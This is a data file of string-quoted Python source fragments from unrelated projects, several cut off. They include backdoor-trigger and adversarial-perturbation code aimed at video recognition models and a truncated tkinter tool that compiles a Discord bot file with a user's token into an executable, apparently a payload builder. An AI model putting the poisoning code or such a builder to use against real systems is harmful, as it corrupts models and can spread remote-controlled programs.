    "import cv2\nimport imageio\nimport os\nimport numpy as np\nimport dataloader.Dataset_rgb as D_rgb\nimport I3D\nimport json\nimport torch.utils.data\nimport torch.nn as nn\nimport torch.utils.tensorboard\nfrom torch.autograd import Variable\nfrom flow_trigger import flow_trigger\n\n\ndef recover(o_img, adv_img, o_x, o_y, ts_x, ts_y):\n    for x in range(ts_x):\n        for y in range(ts_y):\n            adv_img[-x + o_x][-y + o_y] = o_img[-x + o_x][-y + o_y]\n\n\ndef adv_perturb(model, batch, step, adv_step_size, epi, device, criterion):\n    adv, target = batch\n    target = target.to(device)\n    x_nat = adv\n    for i in range(step):\n        adv = Variable(adv.clone().detach(), requires_grad=True)\n        d_adv = adv.to(device)\n        model.zero_grad()\n        output = model(d_adv)\n        loss = criterion(output, target)\n        loss.backward()\n        adv = adv + adv_step_size * torch.sign(adv.grad.data)\n        adv = torch.min(torch.max(adv, x_nat - epi), x_nat + epi)\n        adv = torch.clamp(adv, 0, 255)\n    return adv\n\n\nclass generate_trigger:\n    def __init__(self, flow_len=16, ts_x=15, ts_y=40):\n        self.batch_size = 1\n        self.num_worker = 8\n        self.max_step = 40\n        self.adv_step_size = -2\n        self.trigger_size = 20\n        self.epi = 32\n        self.device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n        self.stride_x = 5\n        self.stride_y = 5\n        self.o_x = -20\n        self.o_y = 115\n\n        self.m_x = self.o_x - self.stride_x\n        self.m_y = self.o_y\n\n        self.v_o_x = 140\n        self.v_o_y = -10\n\n        self.v_m_x = self.v_o_x\n        self.v_m_y = self.v_o_y - self.stride_y\n        self.flow_trigger_size = 20\n\n        self.ts_x = ts_x\n        self.ts_y = ts_y\n        self.v_ts_x = 40\n        self.v_ts_y = 15\n        self.var = 20\n        self.pixel_round = 4\n        self.flow_len = 16\n\n        # load 'config.json'\n        with open('../config.json', 'r') as file:\n            conf = json.load(file)\n        # load 'file_path.json'\n        with open('../file_path.json', 'r') as file:\n            path = json.load(file)\n\n        self.data_type = conf['data_type']\n        self.model_path = conf['%s-rgb-model' % self.data_type]\n\n        self.add_adv = conf['adv']\n        self.poi_tar = conf['poi_target']\n\n        if (not self.data_type == \"ucf-101\") and (not self.data_type == \"hmdb-51\"):\n            print(\"data type error, only 'ucf-101' or 'hmdb-51' is allowed\")\n\n        self.img_path = path[\"%s_frames\" % self.data_type]\n\n        self.ba_test_split_path = \"../\"+path[\"%s-ba_test_split\" % self.data_type]\n        self.nc = conf['num_classes']\n\n        self.flow_path = path[\"%s_ba_test_flows\" % self.data_type]\n        if self.add_adv:\n            self.modify_path = path[\"%s_ba_test_frames-adv\" % self.data_type]\n        else:\n            self.modify_path = path[\"%s_ba_test_frames-poi\" % self.data_type]\n        self.preprocess(self.ba_test_split_path)\n\n    def preprocess(self, list_file):\n        with open('../file_path.json', 'r') as f:\n            path = json.load(f)\n\n        videos = []\n        flow_videos = []\n        with open(list_file) as f:\n            for line in f:\n                p = os.path.join(self.modify_path, line.strip())\n                if not os.path.exists(p):\n                    os.makedirs(p)\n                videos.append(p)\n                flow_p = os.path.join(self.flow_path, line.strip())\n                if not os.path.exists(flow_p):\n                    os.makedirs(flow_p)\n                flow_videos.append(flow_p)\n\n        train_adv_ex = D_rgb.UCF101(\"../\"+path['%s-class_idx' % self.data_type], split=list_file,\n                                    frames_root=self.img_path, train=False, flip=False, poi_tar=self.poi_tar, clip_len=self.flow_len+1)\n        train_rgb = torch.utils.data.DataLoader(train_adv_ex, batch_size=self.batch_size,\n                                                num_workers=self.num_worker, shuffle=False)\n\n        i3d = I3D.InceptionI3d(num_classes=self.nc, in_channels=3, mode='rgb')\n\n        i3d.load_state_dict(torch.load(\"../\"+self.model_path))\n        i3d.to(self.device)\n        i3d.train(False)\n        if self.device == 'cuda':\n            i3d = nn.DataParallel(i3d)\n        criterion = torch.nn.CrossEntropyLoss()\n        num_video = 0\n        for batch_id, batch in enumerate(train_rgb):\n            # add adv perturbations to images or not\n            if self.add_adv:\n                adv = adv_perturb(i3d, batch, self.max_step, self.adv_step_size, self.epi, self.device, criterion)\n            else:\n                adv, _ = batch\n            o_data, _ = batch\n            k = 0\n            for j, clip in enumerate(adv):\n                clip = np.array(clip.detach().numpy()).transpose((1, 2, 3, 0))\n                o_clip = np.array(o_data[k].detach().numpy()).transpose((1, 2, 3, 0))\n                for i in range(self.flow_len+1):\n                    img = clip[i]\n                    img = img.astype('uint8')\n             ",
    "import pandas as pd\nimport numpy as np\n\nendereco = r'C:\\Users\\claud\\OneDrive\\Claudio Bonel-DADOTECA\\_ProfessorClaudioBonel\\SENAC\\UC3 - Machine Learning\\2024.1\\Dados'\n\n# Carregar o arquivo\ndados = pd.read_csv(endereco + r'\\dados_producao_parafusos.csv')\n\n# NECSSIDADE DE NEGOCIO: Qual seria o custo de produ\u00e7ao para as qtde de produ\u00e7ao: 12000, 15000 e 20000 parafusos?\n# Fun\u00e7ao de primeiro grau: y = ax + b, onde y \u00e9 variavel dependente e x \u00e9 a variavel independente\n\n#Isolar as variaveis como vetores\n# CUSTO - Variavel estimada, logo \u00e9 a variavel dependente\ny_custo = dados['Custo de Produ\u00e7\u00e3o (R$)'].values\n\n# QTDE - Variavel que influencia/simulara a estimativa do custo, logo \u00e9 a variavel independente\nx_qtde = dados['Quantidade Produzida (unidades)'].values\n\n#scikit-learn: Biblioteca para Machine Learning\n# A partir dos dados de produ\u00e7ao de parafusos, vamos separar os dados para serem treinados e testados\nfrom sklearn.model_selection import train_test_split\n\nX_qtde_train, X_qtde_test, y_custo_train, y_custo_test = train_test_split(x_qtde,\n                                                                          y_custo,\n                                                                          test_size=0.2,\n                                                                          shuffle=False)\n\n# treinar o modelo\n# importar a classe regressao linear\nfrom sklearn.linear_model import LinearRegression\n\nmodelo = LinearRegression()\n\n# Treinar o modelo\n# gerar a minha equa\u00e7ao de primeiro grau\nmodelo.fit(X_qtde_train.reshape(-1,1), y_custo_train)\n\n# Pontua\u00e7ao do modelo: Serve para verificar se o treino foi eficaz\n# 0 a 1: Quanto mais proximo de 1, melhor\n# VERIFICAR SE O MODELO EST\u00c1 BOM\nscore = modelo.score(X_qtde_test.reshape(-1,1), y_custo_test)\n\n# testar o modelo nos dados de teste\n# se a necesside eh prever custo(y), logo vou testar somente com os dados de qtde(x)\npredicao = modelo.predict(X_qtde_test.reshape(-1,1))\n\n# retornando a necessidade de negocio\n# Qual seria o custo de produ\u00e7ao para as qtde de produ\u00e7ao: 12000, 15000 e 20000 parafusos?\nqtde_produzida_simulada = np.array([12000, 15000, 20000, 25000])\n\n# Prever o custo de produ\u00e7ao para as qtdes solicitadas\ncusto_producao_pred = modelo.predict(qtde_produzida_simulada.reshape(-1,1))\n\n# Exibir os resultados\nprint(custo_producao_pred)",
    "import streamlit as st\nimport PyPDF2\nfrom utils.mistral_utils import generate_summary\nimport streamlit as st\nfrom utils.mistral_utils import generate_coding_questions\nimport json\n\n\ndef display_interactive_quiz_with_form(quiz_data, doc_name):\n    \"\"\"\n    Display the quiz interactively using a Streamlit form. The form collects all answers and submits them together.\n\n    Args:\n        quiz_data (list): List of dictionaries with 'Question', 'Options', and 'Answer' keys.\n        doc_name (str): The name of the document for unique form keys.\n    \"\"\"\n    form_key = f\"quiz_form_{doc_name.replace(' ', '_')}\"  # Ensure unique form key\n    selected_answers = {}\n\n    # Check if the form is submitted\n    with st.form(form_key):\n        st.write(\"Answer the questions and click 'Submit' to check your score.\")\n\n        # Display each question with radio buttons\n        for idx, question_data in enumerate(quiz_data):\n            st.subheader(f\"Question {idx + 1}: {question_data['Question']}\")\n            selected_answers[idx] = st.radio(\n                f\"Choose an answer for Question {idx + 1}\",\n                options=question_data[\"Options\"],\n                key=f\"{form_key}_q_{idx}\",\n                index=None\n            )\n\n        # Submit button to check the score\n        submit_button = st.form_submit_button(\"Submit & Check Score\")\n\n    # Display results after form submission\n    if submit_button:\n        correct_count = 0\n        total_questions = len(quiz_data)\n\n        # Evaluate answers\n        for idx, question_data in enumerate(quiz_data):\n            user_answer = selected_answers.get(idx)\n            correct_answer = question_data[\"Answer\"]\n\n            if user_answer == correct_answer:\n                correct_count += 1\n                st.success(f\"Question {idx + 1}: Correct!\")\n            else:\n                st.error(f\"Question {idx + 1}: Wrong!\")\n                st.markdown(f\"**Correct Answer:** {correct_answer}\")\n\n        # Display final score\n        st.markdown(f\"### Your Score: {correct_count}/{total_questions}\")\n\n\n\n@st.cache_data\ndef extract_text_from_pdfs(uploaded_files):\n    documents = []\n    for uploaded_file in uploaded_files:\n        pdf_reader = PyPDF2.PdfReader(uploaded_file)\n        text = \"\"\n        for page in pdf_reader.pages:\n            text += page.extract_text()\n        documents.append({\"name\": uploaded_file.name, \"content\": text})\n    return documents\n\n# Display quiz in Streamlit\ndef parse_quiz_response(raw_response):\n    \"\"\"\n    Parse the raw response from the model to extract questions, options, and answers.\n\n    Args:\n        raw_response (str): The raw response string from the model.\n\n    Returns:\n        list: A list of dictionaries with 'Question', 'Options', and 'Answer' keys.\n    \"\"\"\n    try:\n        parsed_quiz = json.loads(raw_response)\n        return parsed_quiz\n    except json.JSONDecodeError as e:\n        st.error(f\"JSONDecodeError: {e}\")\n        return []\n    except Exception as e:\n        st.error(f\"Error: {e}\")\n        return []\n\n\n\n\n\ndef display_enhanced_summary(summary_data):\n    # CSS Styles\n    st.markdown(\"\"\"\n    <style>\n        .summary-card {\n            background-color: #f9f9f9;\n            padding: 20px;\n            border-radius: 10px;\n            margin-bottom: 20px;\n            box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n        }\n        .summary-card h2, .summary-card h3 {\n            font-family: 'Roboto', sans-serif;\n            color: #2c3e50;\n            margin-bottom: 15px;\n        }\n        .summary-card p {\n            font-family: 'Lato', sans-serif;\n            color: #2c3e50;\n            line-height: 1.6;\n            margin-bottom: 10px;\n        }\n        .key-skills ul {\n            list-style: none;\n            padding-left: 0;\n        }\n        .key-skills li::before {\n            content: \"\u2714\ufe0f\";\n            color: #27ae60;\n            margin-right: 8px;\n        }\n        .difficulty-level {\n            display: flex;\n            justify-content: space-around;\n            margin-top: 15px;\n        }\n        .difficulty-item {\n            flex: 1;\n            text-align: center;\n            padding: 10px;\n            font-weight: bold;\n            border-radius: 5px;\n        }\n        .difficulty-item.easy {\n            background-color: #d4edda;\n            color: #155724;\n        }\n        .difficulty-item.medium {\n            background-color: #fff3cd;\n            color: #856404;\n        }\n        .difficulty-item.hard {\n            background-color: #f8d7da;\n            color: #721c24;\n        }\n        .highlight {\n            border: 2px solid #000;\n        }\n    </style>\n    \"\"\", unsafe_allow_html=True)\n\n    # Render Summary Section\n    st.markdown(f\"\"\"\n    <div class=\"summary-card\">\n        <h2>Summary</h2>\n        <p>{summary_data['summary']}</p>\n    </div>\n    \"\"\", unsafe_allow_html=True)\n\n    # Render Key Skills Section\n    st.markdown(f\"\"\"\n    <div class=\"summary-card\">\n        <h3>Key Skills</h3>\n        <div class=\"key-skills\">\n  ",
    "import os\r\nimport sys\r\nimport shutil\r\nimport hashlib\r\nfrom datetime import datetime\r\nimport tkinter as tk\r\nfrom tkinter import filedialog, messagebox, ttk, scrolledtext\r\nimport threading\r\n\r\n# \u8bbe\u7f6e\u4e3b\u9898\u989c\u8272\r\nBG_COLOR = \"#f0f0f0\"\r\nBUTTON_COLOR = \"#4CAF50\"\r\nTEXT_COLOR = \"#333333\"\r\n\r\n# --- \u6587\u4ef6\u5904\u7406\u51fd\u6570 ---\r\n\r\ndef calculate_file_hash(file_path):\r\n    \"\"\"\u8ba1\u7b97\u6587\u4ef6\u7684SHA-256\u54c8\u5e0c\u503c\"\"\"\r\n    hash_sha256 = hashlib.sha256()\r\n    with open(file_path, \"rb\") as f:\r\n        for chunk in iter(lambda: f.read(4096), b\"\"):\r\n            hash_sha256.update(chunk)\r\n    return hash_sha256.hexdigest()\r\n\r\ndef process_files_recursive(source_folder, target_folder, file_extensions, operation=\"\u590d\u5236\", progress_callback=None, log_callback=None):\r\n    \"\"\"\r\n    \u9012\u5f52\u904d\u5386\u6e90\u6587\u4ef6\u5939\uff0c\u5c06\u6307\u5b9a\u7c7b\u578b\u7684\u6587\u4ef6\u590d\u5236\u6216\u79fb\u52a8\u5230\u76ee\u6807\u6587\u4ef6\u5939\uff0c\u5e76\u8bb0\u5f55\u65e5\u5fd7\u3002\r\n    \"\"\"\r\n    moved_files = []  # \u79fb\u52a8\u6216\u590d\u5236\u7684\u6587\u4ef6\r\n    skipped_files = []  # \u8df3\u8fc7\u7684\u6587\u4ef6\r\n\r\n    # \u786e\u4fdd\u76ee\u6807\u6587\u4ef6\u5939\u5b58\u5728\r\n    if not os.path.exists(target_folder):\r\n        os.makedirs(target_folder)\r\n\r\n    # \u521b\u5efa\u65e5\u5fd7\u6587\u4ef6\u540d\uff0c\u5305\u542b\u65e5\u671f\u548c\u65f6\u95f4\r\n    log_filename = datetime.now().strftime(\"operation_log_%Y-%m-%d_%H-%M-%S.txt\")\r\n    log_path = os.path.join(target_folder, log_filename)  # \u65e5\u5fd7\u4fdd\u5b58\u5230\u76ee\u6807\u6587\u4ef6\u5939\r\n\r\n    # \u83b7\u53d6\u9700\u5904\u7406\u7684\u603b\u6587\u4ef6\u6570\r\n    all_files = [\r\n        os.path.join(root, file)\r\n        for root, _, files in os.walk(source_folder)\r\n        for file in files if file.endswith(file_extensions)\r\n    ]\r\n\r\n    # \u5982\u679c\u6ca1\u6709\u627e\u5230\u6587\u4ef6\uff0c\u76f4\u63a5\u8fd4\u56de\r\n    if not all_files:\r\n        start_button.config(state=\"normal\")  # \u91cd\u65b0\u542f\u7528\u6309\u94ae (\u5728\u591a\u7ebf\u7a0b\u4e2d\u65e0\u6cd5\u76f4\u63a5\u64cd\u4f5c Tkinter \u63a7\u4ef6)\r\n        messagebox.showinfo(\"\u63d0\u793a\", \"\u6e90\u8def\u5f84\u4e0b\u6ca1\u6709\u627e\u5230\u6307\u5b9a\u7c7b\u578b\u7684\u6587\u4ef6\u3002\")\r\n        return\r\n\r\n    # \u5199\u5165\u65e5\u5fd7\r\n    with open(log_path, \"w\", encoding=\"utf-8\") as log:\r\n        # \u5199\u5165\u603b\u4f53\u4fe1\u606f\r\n        log.write(\"=== \u6587\u4ef6\u64cd\u4f5c\u65e5\u5fd7 ===\\n\")\r\n        log.write(f\"\u6e90\u8def\u5f84\uff1a{source_folder}\\n\")\r\n        log.write(f\"\u76ee\u6807\u8def\u5f84\uff1a{target_folder}\\n\")\r\n        log.write(f\"\u64cd\u4f5c\u7c7b\u578b\uff1a{operation}\\n\")\r\n        log.write(f\"\u603b\u6587\u4ef6\u6570\uff1a{len(all_files)} \u4e2a\\n\")\r\n        log.write(\"\\n=== \u6587\u4ef6\u5904\u7406\u8be6\u60c5 ===\\n\")\r\n\r\n    # \u521d\u59cb\u5316\u8fdb\u5ea6\u6761\r\n    if progress_callback:\r\n        progress_callback(0, len(all_files), \"\")\r\n\r\n    # \u7f13\u5b58\u76ee\u6807\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\r\n    target_file_hashes = {}\r\n\r\n    for index, source_path in enumerate(all_files):\r\n        filename = os.path.basename(source_path)\r\n        target_path = os.path.join(target_folder, filename)\r\n\r\n        if os.path.exists(target_path):\r\n            if target_path not in target_file_hashes:\r\n                target_file_hashes[target_path] = calculate_file_hash(target_path)\r\n            source_hash = calculate_file_hash(source_path)\r\n            if source_hash == target_file_hashes[target_path]:\r\n                skipped_files.append(filename)\r\n                # \u5199\u5165\u65e5\u5fd7\r\n                with open(log_path, \"a\", encoding=\"utf-8\") as log:\r\n                    log.write(f\"[\u8df3\u8fc7] \u6587\u4ef6\u5df2\u5b58\u5728\u4e14\u5185\u5bb9\u76f8\u540c: {filename}\\n\")\r\n                if log_callback:\r\n                    log_callback(f\"[\u8df3\u8fc7] \u6587\u4ef6\u5df2\u5b58\u5728\u4e14\u5185\u5bb9\u76f8\u540c: {filename}\\n\")\r\n            else:\r\n                base, ext = os.path.splitext(filename)\r\n                counter = 1\r\n                new_target_path = os.path.join(target_folder, f\"{base}_{counter}{ext}\")\r\n                while os.path.exists(new_target_path):\r\n                    counter += 1\r\n                    new_target_path = os.path.join(target_folder, f\"{base}_{counter}{ext}\")\r\n                # \u590d\u5236\u6216\u79fb\u52a8\u6587\u4ef6\r\n                if operation == \"\u590d\u5236\":\r\n                    shutil.copy2(source_path, new_target_path)\r\n                    moved_files.append(f\"{filename} -> {os.path.basename(new_target_path)}\")\r\n                    # \u5199\u5165\u65e5\u5fd7\r\n                    with open(log_path, \"a\", encoding=\"utf-8\") as log:\r\n                        log.write(f\"[\u590d\u5236] {filename} \u91cd\u547d\u540d\u4e3a {os.path.basename(new_target_path)}\\n\")\r\n                    if log_callback:\r\n                        log_callback(f\"[\u590d\u5236] {filename} \u91cd\u547d\u540d\u4e3a {os.path.basename(new_target_path)}\\n\")\r\n                else:  # \u79fb\u52a8\r\n                    shutil.move(source_path, new_target_path)\r\n                    moved_files.append(f\"{filename} -> {os.path.basename(new_target_path)}\")\r\n                    # \u5199\u5165\u65e5\u5fd7\r\n                    with open(log_path, \"a\", encoding=\"utf-8\") as log:\r\n                        log.write(f\"[\u79fb\u52a8] {filename} \u91cd\u547d\u540d\u4e3a {os.path.basename(new_target_path)}\\n\")\r\n                    if log_callback:\r\n                        log_callback(f\"[\u79fb\u52a8] {filename} \u91cd\u547d\u540d\u4e3a {os.path.basename(new_target_path)}\\n\")\r\n        else:\r\n            # \u590d\u5236\u6216\u79fb\u52a8\u6587\u4ef6\r\n            if operation == \"\u590d\u5236\":\r\n                shutil.copy2(source_path, target_path)\r\n                moved_files.append(filename)\r\n                # \u5199\u5165\u65e5\u5fd7\r\n                with open(log_path, \"a\", encoding=\"utf-8\") as log:\r\n                    log.write(f\"[\u590d\u5236] {filename}\\n\")\r\n                if log_callback:\r\n                    log_callback(f\"[\u590d\u5236] {filename}\\n\")\r\n            else:  # \u79fb\u52a8\r\n                shutil.move(source_path, target_path)\r\n                moved_files.append(filename)\r\n                # \u5199\u5165\u65e5\u5fd7\r\n                with open(log_path, \"a\", encoding=\"utf-8\") as log:\r\n                    log.write(f\"[\u79fb\u52a8] {filename}\\n\")\r\n                if log_callback:\r\n                    log_callback(f\"[\u79fb\u52a8] {filename}\\n\")\r\n\r\n",
    "#!/usr/bin/env python3\nimport os\nimport re\nimport subprocess\nimport urllib.parse\nfrom datetime import datetime  # <-- for appending today's date\n\n# Adjust these constants to your project\nWRITEUPS_DIR = \"Resources/Personal/Write-ups\"  \nREADME_PATH = \"README.md\"\nLATEST_SECTION_HEADER = \"## \ud83d\udd0d Latest Blog Posts\"\nGITHUB_BASE_URL = \"https://github.com/L0WK3Y-IAAN/Hunting-With-L0WK3Y/tree/main\"\n\ndef get_writeup_readmes(directory):\n    \"\"\"\n    Recursively scan `directory` for any 'readme.md' files, case-insensitive.\n    Returns a list of full file paths.\n    \"\"\"\n    found_readmes = []\n    if not os.path.exists(directory):\n        print(f\"Directory '{directory}' does not exist.\")\n        return found_readmes\n\n    for root, dirs, files in os.walk(directory):\n        for f in files:\n            if f.lower() == \"readme.md\":\n                full_path = os.path.join(root, f)\n                found_readmes.append(full_path)\n    return found_readmes\n\ndef generate_markdown_links(paths):\n    \"\"\"\n    Convert each README file path to a full GitHub URL, \n    with the parent folder as the link text, and append today's date.\n    \"\"\"\n    md_lines = []\n    # Get today's date in YYYY-MM-DD format\n    today_str = datetime.now().strftime(\"%m-%d-%Y\")\n\n    for p in sorted(paths):\n        # The folder name becomes the link text\n        folder_name = os.path.basename(os.path.dirname(p))\n\n        # Relative path from the current working directory\n        rel_path = os.path.relpath(p, \".\")\n        # Replace backslashes with forward slashes\n        forward_slash_path = rel_path.replace(\"\\\\\", \"/\")\n        # URL-encode to handle spaces, etc.\n        encoded_path = urllib.parse.quote(forward_slash_path)\n\n        # Combine with base URL, e.g.:\n        # https://github.com/L0WK3Y-IAAN/Hunting-With-L0WK3Y/tree/main/Resources/...\n        final_url = f\"{GITHUB_BASE_URL}/{encoded_path}\"\n\n        # Format: - [FolderName](full_url) - YYYY-MM-DD\n        md_lines.append(f\"- [{folder_name}]({final_url}) \u2013 {today_str}\")\n\n    return \"\\n\".join(md_lines)\n\ndef read_file(filepath):\n    \"\"\"Return the text content of a file.\"\"\"\n    with open(filepath, \"r\", encoding=\"utf-8\") as f:\n        return f.read()\n\ndef write_file(filepath, content):\n    \"\"\"Write text content to a file.\"\"\"\n    with open(filepath, \"w\", encoding=\"utf-8\") as f:\n        f.write(content)\n\ndef insert_into_readme(readme_content, insert_text):\n    \"\"\"\n    Insert `insert_text` immediately after the header line \"## \ud83d\udd0d Latest Blog Posts\".\n    \"\"\"\n    pattern = rf\"({LATEST_SECTION_HEADER}\\s*\\n+)\"\n    replacement = rf\"\\1{insert_text}\\n\\n\"\n    updated = re.sub(pattern, replacement, readme_content)\n    return updated\n\ndef configure_git():\n    \"\"\"Configure Git user name and email if not already set.\"\"\"\n    try:\n        # Check if user.name is set\n        result = subprocess.run(\n            [\"git\", \"config\", \"user.name\"],\n            capture_output=True,\n            text=True\n        )\n        if not result.stdout.strip():\n            subprocess.run(\n                [\"git\", \"config\", \"user.name\", \"L0WK3Y-IAAN\"],\n                check=True\n            )\n            print(\"Configured git user.name.\")\n        \n        # Check if user.email is set\n        result = subprocess.run(\n            [\"git\", \"config\", \"user.email\"],\n            capture_output=True,\n            text=True\n        )\n        if not result.stdout.strip():\n            subprocess.run(\n                [\"git\", \"config\", \"user.email\", \"you@example.com\"],\n                check=True\n            )\n            print(\"Configured git user.email.\")\n    except subprocess.CalledProcessError as e:\n        print(\"Failed to configure Git user information:\")\n        print(e.stderr)\n        exit(1)\n\n\ndef main():\n    # 0. Configure Git user\n    configure_git()\n    \n    # 1. Collect all subdirectory READMEs\n    readme_paths = get_writeup_readmes(WRITEUPS_DIR)\n    if not readme_paths:\n        print(f\"No 'readme.md' files found under '{WRITEUPS_DIR}'. Exiting.\")\n        return\n\n    # 2. Generate new markdown links for these READMEs\n    new_md_content = generate_markdown_links(readme_paths)\n\n    # 3. Read the top-level README.md\n    if not os.path.exists(README_PATH):\n        print(f\"Could not find '{README_PATH}' in the current directory. Exiting.\")\n        return\n    original_readme = read_file(README_PATH)\n\n    # 4. Insert or update the \"Latest Blog Posts\" section\n    updated_readme = insert_into_readme(original_readme, new_md_content)\n\n    # 5. If changes were made, write them and commit\n    if updated_readme != original_readme:\n        write_file(README_PATH, updated_readme)\n        print(\"README updated with new entries. Committing changes...\")\n\n        subprocess.run([\"git\", \"add\", README_PATH], check=True)\n        subprocess.run([\"git\", \"commit\", \"-m\", \"\ud83d\udfe2 New Write-up Added!\"], check=True)\n        subprocess.run([\"git\", \"push\", \"origin\", \"main\"], check=True)\n    else:\n        print(\"No changes detected in README.md.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import os\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport torch\nimport scipy.io\n\n\n# Save figure\ndef save_figure(fig, title, directory=os.path.join(\"output\", \"figure\")):\n    \"\"\"\n    Saves the given figure to the specified directory with the provided title.\n    \"\"\"\n    if not os.path.exists(directory):\n        os.makedirs(directory)  # \u521b\u5efa\u76ee\u5f55\n    filepath = os.path.join(directory, f\"{title}.png\")\n    fig.savefig(filepath, dpi=600, bbox_inches='tight')\n    print(f\"Figure saved to {filepath}\")\n\n\ndef plotLoss(losses_dict, info=[\"IC\", \"BC\", \"PDE\"], filename=\"training_losses\"):\n    \"\"\"\n    Plots the training losses for IC, BC, and PDE components and saves the figure.\n    \"\"\"\n    fig, axes = plt.subplots(1, 3, sharex=True, sharey=True, figsize=(10, 6))\n    axes[0].set_yscale(\"log\")\n    for i, j in zip(range(3), info):\n        key = f\"loss_{j.lower()}\"  # Construct the correct key\n        if key in losses_dict:\n            axes[i].plot(losses_dict[key])\n            axes[i].set_title(j)\n        else:\n            print(f\"Warning: Key '{key}' not found in losses_dict\")\n    plt.tight_layout()\n    save_figure(fig, filename)\n    plt.show()\n\n\ndef plot_2d_heatmap(X, T, data, title, colorbar_label, filename=\"2d_heatmap\"):\n    \"\"\"\n    Plots a 2D heatmap for the given data and saves it.\n    \"\"\"\n    fig = plt.figure(figsize=(10, 6))\n    plt.contourf(X, T, data, levels=50, cmap=\"viridis\")\n    plt.colorbar(label=colorbar_label)\n    plt.title(title)\n    plt.xlabel(\"x\")\n    plt.ylabel(\"t\")\n    save_figure(fig, filename)\n    plt.show()\n\n\ndef plot_3d_surface(X, T, data, title, filename=\"3d_surface\"):\n    \"\"\"\n    Plots a 3D surface for the given data and saves it.\n    \"\"\"\n    fig = plt.figure(figsize=(12, 8))\n    ax = fig.add_subplot(111, projection='3d')\n    ax.plot_surface(X, T, data, cmap='viridis')\n    ax.set_title(title)\n    ax.set_xlabel(\"x\")\n    ax.set_ylabel(\"t\")\n    ax.set_zlabel(\"Predicted Solution Magnitude\")\n    save_figure(fig, filename)\n    plt.show()\n\n\ndef plot_losses(self, filename=\"loss_components\"):\n    \"\"\"\n    Plots all loss components except L2 norm losses and saves the figure.\n    \"\"\"\n    fig = plt.figure(figsize=(12, 8))\n\n    # Plot loss components excluding L2 losses\n    for key in [\"loss_u\", \"loss_v\", \"loss_fu\", \"loss_fv\"]:\n        plt.plot(self.losses[key], label=key)\n\n    plt.xlabel(\"Iteration\")\n    plt.ylabel(\"Loss\")\n    plt.title(\"Training Loss Components Over Iterations\")\n    plt.legend()\n    plt.grid()\n    save_figure(fig, filename)\n    plt.show()\n\n\ndef plot_log10_losses(self, filename=\"log10_loss_components\"):\n    \"\"\"\n    Plots the log10 of all loss components on the same plot and saves the figure.\n    \"\"\"\n    fig = plt.figure(figsize=(12, 8))\n\n    # Plot log10 loss components\n    plt.plot(self.losses[\"log10_loss_u\"], label=\"log10_loss_u\")\n    plt.plot(self.losses[\"log10_loss_v\"], label=\"log10_loss_v\")\n    plt.plot(self.losses[\"log10_loss_fu\"], label=\"log10_loss_fu\")\n    plt.plot(self.losses[\"log10_loss_fv\"], label=\"log10_loss_fv\")\n\n    plt.xlabel(\"Iteration\")\n    plt.ylabel(\"log10(Loss)\")\n    plt.title(\"Log10 of Loss Components Over Iterations\")\n    plt.legend()\n    plt.grid()\n    save_figure(fig, filename)\n    plt.show()\n\n\ndef plot_l2_losses(self, filename=\"l2_losses\"):\n    \"\"\"\n    Plots the L2 norm loss and its log10 value separately and saves the figure.\n    \"\"\"\n    fig = plt.figure(figsize=(12, 6))\n\n    # Plot L2 norm loss\n    plt.subplot(1, 2, 1)\n    plt.plot(self.losses[\"loss_l2\"], label=\"L2 Norm Loss\", color=\"b\")\n    plt.xlabel(\"Iteration\")\n    plt.ylabel(\"L2 Norm Loss\")\n    plt.title(\"L2 Norm Loss Over Iterations\")\n    plt.legend()\n    plt.grid()\n\n    # Plot log10 of L2 norm loss\n    plt.subplot(1, 2, 2)\n    plt.plot(self.losses[\"log10_loss_l2\"], label=\"log10(L2 Norm Loss)\", color=\"r\")\n    plt.xlabel(\"Iteration\")\n    plt.ylabel(\"log10(L2 Norm Loss)\")\n    plt.title(\"Log10(L2 Norm Loss) Over Iterations\")\n    plt.legend()\n    plt.grid()\n\n    plt.tight_layout()\n    save_figure(fig, filename)\n    plt.show()\n\n\ndef plot_sampling_points(X_ic, X_lb, X_ub, X_sample, filename=\"sampling_points\"):\n    \"\"\"\n    Plots the sampling points for initial condition, boundary condition, and random points and saves the figure.\n    \"\"\"\n    fig = plt.figure(figsize=(10, 6))\n\n    # Plot initial condition points\n    plt.scatter(X_ic[:, 0].cpu(), X_ic[:, 1].cpu(), color='blue', label='Initial Condition')\n\n    # Plot boundary condition points\n    plt.scatter(X_lb[:, 0].cpu(), X_lb[:, 1].cpu(), color='green', label='Boundary Condition (Lower)')\n    plt.scatter(X_ub[:, 0].cpu(), X_ub[:, 1].cpu(), color='red', label='Boundary Condition (Upper)')\n\n    # Plot random points\n    plt.scatter(X_sample[:, 0].cpu(), X_sample[:, 1].cpu(), color='orange', label='Random Points', alpha=0.1)\n\n    plt.xlabel('x')\n    plt.ylabel('t')\n    plt.title('Sampling Points')\n    plt.legend()\n    plt.grid()\n    save_figure(fig, filename)\n    plt.show()\n\n\ndef plot_magnitude_comparison_subplots(pinn, times, x_range=(-5.0, 5.0), filename=\"magnitud",
    "# -*- coding: utf-8 -*-\nimport subprocess\nimport tkinter as tk\nfrom tkinter import messagebox\nfrom tkinter import filedialog\nfrom tkinter import Toplevel\nfrom tkinter import ttk  # Importar ttk para usar Progressbar\nimport threading\nfrom PIL import Image, ImageTk\nimport os\n\ndef compile_to_exe():\n    # Obtener el Bot Token y Server ID ingresados\n    bot_token = entry_token.get()\n    server_id = entry_server.get()\n\n    if not bot_token or not server_id:\n        messagebox.showerror(\"Error\", \"Por favor, ingrese ambos par\u00e1metros: Bot Token y Server ID.\")\n        return\n\n    # Abrir el archivo Python existente para editarlo\n    file_path = filedialog.askopenfilename(\n        defaultextension=\".py\",\n        filetypes=[(\"Python Files\", \"*.py\")],\n        title=\"Seleccionar archivo de bot\"\n    )\n\n    if not file_path:\n        return  # Si el usuario cancela, no hacer nada\n\n    # Crear una ventana emergente para mostrar la barra de progreso y la imagen\n    progress_window = Toplevel()\n    progress_window.title(\"Compilando...\")\n    progress_window.geometry(\"500x150\")\n    progress_window.configure(bg=\"#2E2E2E\")\n    progress_window.resizable(False, False)\n\n    # Agregar la imagen del diablo\n    try:\n        # Obtener la ruta absoluta desde el directorio donde se ejecuta el script\n        script_dir = os.path.dirname(os.path.abspath(__file__))  # Directorio del script\n        image_path = os.path.join(script_dir, \"logoCompiler/diablo_emote.png\")  # Ruta absoluta a la imagen\n\n        diablo_img = Image.open(image_path)  # Abrir la 